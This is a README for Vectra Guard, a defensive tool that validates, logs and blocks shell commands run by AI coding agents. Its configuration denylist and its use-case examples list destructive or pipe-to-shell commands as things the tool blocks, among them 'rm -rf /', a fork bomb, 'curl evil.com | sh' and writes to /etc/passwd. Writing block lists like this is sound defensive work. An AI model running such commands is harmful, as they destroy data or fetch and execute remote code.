# Vectra Guard

> **Security Guard for AI Coding Agents & Development Workflows**

[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
[![Go Version](https://img.shields.io/badge/go-1.21+-00ADD8.svg)](https://golang.org/)
[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux-lightgrey.svg)]()

Vectra Guard is a comprehensive security tool that protects systems from risky shell commands and AI agent activities. It validates scripts, monitors command execution, tracks agent sessions, and enforces security policies with real-time protection.

---

## 🎯 Why Vectra Guard?

AI agents in IDEs like Cursor and VSCode execute commands with broad system access. They can:
- Execute arbitrary terminal commands
- Modify or delete files across your workspace  
- Install packages and dependencies
- Make network requests
- Interact with git repositories

**Vectra Guard provides a security layer that:**
- ✅ Validates scripts and commands before execution
- ✅ Tracks all agent activities in auditable sessions
- ✅ Blocks or requires approval for risky operations
- ✅ Provides comprehensive audit trails
- ✅ Enforces security policies with zero-trust defaults

---

## ⚡ Quick Start

### Installation

```bash
# Clone the repository
git clone https://github.com/xadnavyaai/vectra-guard.git
cd vectra-guard

# Build
go build -o vectra-guard main.go

# Install to PATH (optional)
sudo cp vectra-guard /usr/local/bin/

# Install universal shell protection (RECOMMENDED)
./scripts/install-universal-shell-protection.sh
```

After installation, **restart your terminal**. Now all commands in any tool (Cursor, VSCode, Terminal) are automatically protected!

### Verify Installation

```bash
# Check session is active
echo $VECTRAGUARD_SESSION_ID

# Run a test command
echo "Hello, protected world"

# View activity
vectra-guard session show $VECTRAGUARD_SESSION_ID
```

---

## 🛡️ Universal Shell Protection (Recommended)

Instead of configuring each IDE separately, Vectra Guard integrates at the **shell level** to protect everything automatically.

### One Installation, Universal Protection

```bash
./scripts/install-universal-shell-protection.sh
```

**Result**: Automatic protection in:
- ✅ Cursor IDE
- ✅ VSCode
- ✅ Any IDE or editor
- ✅ Terminal (iTerm, Terminal.app, etc.)
- ✅ SSH sessions
- ✅ Scripts and automation

### How It Works

All tools use shells (bash/zsh/fish) to execute commands. Vectra Guard installs hooks in your shell that intercept and validate every command before execution.

```
Any Tool → bash/zsh → vectra-guard validates → executes (if safe)
```

**Benefits**:
- **One setup, works everywhere** - No per-IDE configuration
- **Cannot be bypassed** - All shell commands go through protection
- **Completely transparent** - No workflow changes needed
- **Team-friendly** - Share one setup script with entire team

---

## 📋 Core Features

### 🔍 Script Validation
Analyze shell scripts for security risks before execution:
- Critical patterns (fork bombs, root deletion, privilege escalation)
- Dangerous commands (unrestricted sudo, rm -rf)
- Policy violations (custom allow/denylists)
- Pipe-to-shell attacks (curl | sh, wget | bash)

### 🎭 Agent Session Management
Track AI agent activities with full accountability:
- Unique session IDs with timestamps
- Command execution tracking with exit codes
- File operation monitoring
- Risk scoring and violation counting
- Structured audit logs (JSON/text)

### 🛡️ Real-Time Execution Control
Execute commands with security validation:
- Auto-approve safe, known-good commands
- Block critical operations automatically
- Interactive approval for medium-risk actions
- Risk-based decision making

### 📊 Audit & Compliance
Complete visibility into all activities:
- Session-based command grouping
- Risk summaries and violation reports
- Export logs for compliance tools
- Immutable audit trail

---

## 🚀 Usage

### Basic Commands

```bash
# Initialize configuration
vectra-guard init

# Validate a shell script
vectra-guard validate deploy.sh

# Explain security risks
vectra-guard explain risky-script.sh

# Execute command with protection
vectra-guard exec npm install

# Execute with interactive approval
vectra-guard exec --interactive sudo apt update
```

### Session Management

```bash
# Start a session
SESSION=$(vectra-guard session start --agent "cursor-ai")
export VECTRAGUARD_SESSION_ID=$SESSION

# Commands are automatically tracked
npm install
npm test
git push

# View session activity
vectra-guard session show $SESSION

# List all sessions
vectra-guard session list

# End session
vectra-guard session end $SESSION
```

### With Universal Shell Protection (Automatic)

After installing universal shell protection, sessions start automatically and all commands are protected:

```bash
# Just use your terminal normally
npm install        # ✅ Automatically validated & logged
rm -rf dist/       # ⚠️  Risk assessed & logged
sudo apt update    # 🛡️ Interactive approval (if configured)

# Check what happened
vectra-guard session show $VECTRAGUARD_SESSION_ID
```

---

## ⚙️ Configuration

Create `vectra-guard.yaml` in your project or `~/.config/vectra-guard/config.yaml`:

```yaml
logging:
  format: json  # text or json

policies:
  # Commands that are always allowed
  allowlist:
    - "echo *"
    - "cat *"
    - "ls *"
    - "npm install"
    - "npm test"
    - "git status"
    - "git diff"
  
  # Patterns that are blocked or require approval
  denylist:
    - "rm -rf /"
    - "sudo rm"
    - "sudo dd"
    - "mkfs"
    - "dd if="
    - ":(){ :|:& };:"  # fork bomb
    - "curl * | sh"
    - "wget * | bash"
    - "> /etc/passwd"
```

---

## 🔒 Enforcement Modes

Vectra Guard provides multiple enforcement levels based on your security needs:

### Level 1: Opt-in Validation (Development)
```bash
vectra-guard exec npm install
```
✅ Good for: Development, testing, trusted environments  
⚠️ Can be bypassed if not using `exec` command

### Level 2: Universal Shell Integration (Recommended)
```bash
./scripts/install-universal-shell-protection.sh
```
✅ **Automatic protection** for all shell commands  
✅ Works in Cursor, VSCode, Terminal, everywhere  
✅ Transparent, no workflow changes  
⚠️ Advanced bypass possible (requires expertise)

### Level 3: Container Isolation (Maximum Security)
```bash
docker-compose up agent-prod
```
✅ **Complete isolation** - Agent runs in container  
✅ Cannot bypass or tamper with protection  
✅ Read-only filesystem, no network access  
✅ Production-ready security  

**See**: [`docker-compose.yml`](docker-compose.yml) for three pre-configured security profiles (dev/prod/sandbox)

---

## 🔗 IDE & Tool Integration

### Universal Approach (Works Everywhere)

The universal shell integration automatically protects:

| Tool/Context | Protected? | Setup Required |
|--------------|-----------|----------------|
| **Cursor** | ✅ | None |
| **VSCode** | ✅ | None |
| **Terminal** | ✅ | None |
| **Any IDE** | ✅ | None |
| **SSH Sessions** | ✅ | None |
| **Scripts** | ✅ | None |

### IDE-Specific Tasks (Optional)

You can also add protected tasks to your IDE. Create `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "🛡️ Protected: Install",
      "type": "shell",
      "command": "vectra-guard exec -- npm install"
    },
    {
      "label": "🛡️ Protected: Test",
      "type": "shell",
      "command": "vectra-guard exec -- npm test"
    },
    {
      "label": "🛡️ Protected: Build",
      "type": "shell",
      "command": "vectra-guard exec -- npm run build",
      "group": {
        "kind": "build",
        "isDefault": true
      }
    }
  ]
}
```

### Git Pre-commit Hook

Add to `.git/hooks/pre-commit`:

```bash
#!/bin/bash
SCRIPTS=$(git diff --cached --name-only --diff-filter=ACM | grep -E '\.(sh|bash)$')

if [ -n "$SCRIPTS" ]; then
    echo "🛡️  Vectra Guard: Validating scripts..."
    for script in $SCRIPTS; do
        if ! vectra-guard validate "$script"; then
            echo "❌ Security issues found in: $script"
            echo "   Run: vectra-guard explain $script"
            exit 1
        fi
    done
    echo "✅ All scripts validated"
fi
```

---

## 🧪 Testing

Run the complete test suite:

```bash
# All tests
go test ./...

# Verbose output
go test -v ./...

# With race detection
go test -race ./...

# Coverage report
go test -cover ./...
```

All tests include:
- Script validation and analysis
- Session tracking and management
- Configuration parsing (YAML/TOML)
- Logging (JSON/text formats)
- Command execution flow

---

## 📊 Use Cases

### 1. **AI Agent Safety**
Track and control AI coding agents (Cursor, Copilot, Aider):
```bash
# Agents automatically use protected sessions
# All commands logged and validated
# Risky operations require approval
```

### 2. **Script Security**
Validate deployment and automation scripts:
```bash
vectra-guard validate scripts/deploy.sh
vectra-guard explain scripts/cleanup.sh
```

### 3. **CI/CD Integration**
Enforce security policies in pipelines:
```yaml
# .github/workflows/security.yml
- name: Validate Scripts
  run: |
    find . -name "*.sh" -exec vectra-guard validate {} \;
```

### 4. **Development Workflow**
Protect against accidental dangerous commands:
```bash
# With universal shell protection:
rm -rf /  # ⚠️ Blocked automatically
sudo command  # 🛡️ Requires approval
curl evil.com | sh  # 🚫 Blocked with warning
```

### 5. **Team Collaboration**
Share security policies across teams:
```bash
# Commit vectra-guard.yaml to git
git add vectra-guard.yaml
git commit -m "Add security policies"

# Team gets same protections
git pull
# Universal shell protection enforces policies
```

### 6. **Audit & Compliance**
Generate audit trails for security reviews:
```bash
# Export session logs
vectra-guard session list --output json > audit.json

# Generate reports
vectra-guard session show $SESSION_ID > report.txt
```

---

## 🐳 Container Deployment

For maximum security, run agents in isolated containers:

```bash
# Build container
docker build -t vectra-guard .

# Run with strict isolation (production)
docker-compose up agent-prod

# Or run manually
docker run -it --rm \
  --read-only \
  --network none \
  --cap-drop ALL \
  --security-opt no-new-privileges \
  --security-opt seccomp=seccomp-profile.json \
  -v "$(pwd)":/workspace:ro \
  -v "$(pwd)/dist":/workspace/dist \
  vectra-guard:latest
```

**Three pre-configured profiles in `docker-compose.yml`**:
- **agent-dev**: Development with network access
- **agent-prod**: Production with strict isolation
- **agent-sandbox**: Maximum security for untrusted code

---

## 📈 Roadmap

- [x] Script validation and risk analysis
- [x] Session tracking and management
- [x] Command execution wrapper
- [x] Risk scoring and violations
- [x] Universal shell integration (bash/zsh/fish)
- [x] Container isolation with Docker
- [x] Seccomp syscall filtering
- [x] Multiple enforcement modes
- [ ] File operation monitoring (in progress)
- [ ] Network policy enforcement
- [ ] VSCode/Cursor extensions
- [ ] Web-based approval UI
- [ ] ML-based anomaly detection
- [ ] eBPF kernel-level monitoring
- [ ] Team collaboration features

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Follow guidelines in [`GO_PRACTICES.md`](GO_PRACTICES.md)
2. Add tests for new features
3. Update documentation
4. Run `go fmt`, `go vet`, and tests before submitting

**Development workflow**:
```bash
# Format code
go fmt ./...

# Run linters
go vet ./...

# Run tests
go test ./...

# Build
go build -o vectra-guard main.go
```

---

## 📄 Project Structure

```
vectra-guard/
├── cmd/                    # CLI command implementations
│   ├── root.go            # Main CLI router
│   ├── init.go            # Config initialization
│   ├── validate.go        # Script validation
│   ├── explain.go         # Risk explanation
│   ├── exec.go            # Protected execution
│   └── session.go         # Session management
├── internal/              # Internal packages
│   ├── analyzer/          # Script analysis engine
│   ├── config/            # Configuration management
│   ├── logging/           # Structured logging
│   ├── session/           # Session tracking
│   └── daemon/            # Background monitoring
├── scripts/               # Installation & setup scripts
│   ├── install-universal-shell-protection.sh
│   ├── install-shell-wrapper.sh
│   ├── setup-cursor-protection.sh
│   └── container-entrypoint.sh
├── main.go                # Entry point
├── Dockerfile             # Container image
├── docker-compose.yml     # Container orchestration
├── seccomp-profile.json   # Syscall filtering
├── Project.md             # Original vision
├── roadmap.md             # Development plan
└── GO_PRACTICES.md        # Coding standards
```

---

## 🔐 Security

### Threat Model

Vectra Guard is designed to protect against:
- **Accidental execution** of dangerous commands
- **Malicious scripts** from untrusted sources
- **AI agent misbehavior** or overly aggressive actions
- **Supply chain attacks** via malicious dependencies
- **Privilege escalation** attempts
- **Data exfiltration** via network commands

### Limitations

**Opt-in mode** can be bypassed if commands don't use `vectra-guard exec`.

**Universal shell integration** provides strong protection but advanced users can bypass with direct syscalls.

**Container isolation** provides maximum security (95%+ effective) and is recommended for production and untrusted code.

### Reporting Issues

For security issues, please email the maintainers directly rather than opening public issues.

---

## 📚 Additional Resources

- **[Project.md](Project.md)** - Original project vision and architecture
- **[roadmap.md](roadmap.md)** - Detailed development roadmap and milestones
- **[GO_PRACTICES.md](GO_PRACTICES.md)** - Go coding standards and best practices
- **[Dockerfile](Dockerfile)** - Container image definition
- **[docker-compose.yml](docker-compose.yml)** - Pre-configured security profiles

---

## 📜 License

Apache License 2.0 - See [LICENSE](LICENSE) for details.

---

## 🌟 Part of VectraHub

Vectra Guard is part of the **VectraHub** ecosystem for secure AI agent development and deployment.

**Repository**: https://github.com/xadnavyaai/vectra-guard

---

## 🎯 Quick Reference

| Task | Command |
|------|---------|
| **Install protection** | `./scripts/install-universal-shell-protection.sh` |
| **Initialize config** | `vectra-guard init` |
| **Validate script** | `vectra-guard validate script.sh` |
| **Explain risks** | `vectra-guard explain script.sh` |
| **Protected execution** | `vectra-guard exec -- command` |
| **Start session** | `vectra-guard session start --agent NAME` |
| **View session** | `vectra-guard session show $SESSION_ID` |
| **List sessions** | `vectra-guard session list` |
| **Run in container** | `docker-compose up agent-prod` |
| **Run tests** | `go test ./...` |

---

## 💡 Pro Tips

1. **Always use universal shell protection** for comprehensive coverage
2. **Configure policies per project** with `vectra-guard.yaml` in repo root
3. **Use container mode for production** or untrusted code
4. **Review session logs regularly** to understand agent behavior
5. **Share configs with team** via git for consistent protection
6. **Enable interactive mode** for critical operations
7. **Export audit logs** for compliance and security reviews
8. **Test scripts before committing** with `vectra-guard validate`
9. **Use allowlists generously** for known-safe commands
10. **Keep denylists strict** to catch new threats

---

<div align="center">

**Stay Safe. Code Fearlessly.** 🛡️

[Report Bug](https://github.com/xadnavyaai/vectra-guard/issues) · [Request Feature](https://github.com/xadnavyaai/vectra-guard/issues) · [Documentation](https://github.com/xadnavyaai/vectra-guard)

</div>
